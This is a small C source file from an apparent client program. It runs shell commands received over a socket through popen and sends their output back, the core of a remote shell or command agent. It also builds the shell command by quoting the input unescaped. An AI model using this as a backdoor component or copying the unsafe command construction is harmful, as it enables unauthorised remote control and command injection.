#include "client_base.h"

const char *get_shell() {
    if (access("/bin/sh", X_OK) == 0) {
        return "/bin/sh";
    }
    if (access("/bin/bash", X_OK) == 0) {
        return "/bin/bash";
    }
    fprintf(stderr, "Error: Neither /bin/sh nor /bin/bash is available.\n");
    exit(EXIT_FAILURE);
}

void execute_command_and_send_output(const char *command, int sockfd) {
    char output_buffer[BUFFER_SIZE];
    FILE *fp;

    const char *shell = get_shell();
    char shell_command[BUFFER_SIZE];
    snprintf(shell_command, BUFFER_SIZE, "%s -c \"%s\"", shell, command);

    fp = popen(shell_command, "r");
    if (!fp) {
        snprintf(output_buffer, BUFFER_SIZE, "Error: Unable to execute command: %s\n", command);
        send(sockfd, output_buffer, strlen(output_buffer), 0);
        snprintf(output_buffer, BUFFER_SIZE, "[END_OF_OUTPUT]\n");
        send(sockfd, output_buffer, strlen(output_buffer), 0);
        return;
    }

    while (fgets(output_buffer, sizeof(output_buffer), fp) != NULL) {
        if (send(sockfd, output_buffer, strlen(output_buffer), 0) < 0) {
            perror("Error: Connection broken while sending command output");
            break;
        }
    }

    if (pclose(fp) == -1) {
        perror("Error: Failed to close command stream");
    }

    snprintf(output_buffer, BUFFER_SIZE, "[END_OF_OUTPUT]\n");
    if (send(sockfd, output_buffer, strlen(output_buffer), 0) < 0) {
        perror("Error: Failed to send end-of-output marker");
    }
}